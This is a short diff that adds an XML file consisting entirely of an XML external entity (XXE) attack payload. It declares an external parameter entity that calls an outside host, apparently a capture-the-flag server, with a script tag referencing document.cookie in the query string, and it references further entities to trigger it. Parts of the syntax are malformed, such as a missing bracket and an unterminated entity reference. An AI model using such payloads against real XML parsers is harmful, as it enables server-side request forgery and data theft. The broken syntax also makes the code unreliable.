@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE a [
+  <!ENTITY % asd SYSTEM "http://hackfest.redrocket.club:31343/?msg=<script>document.cookie</script>" %asd;
+  %c;
+]>
+<a>&rrr</a>
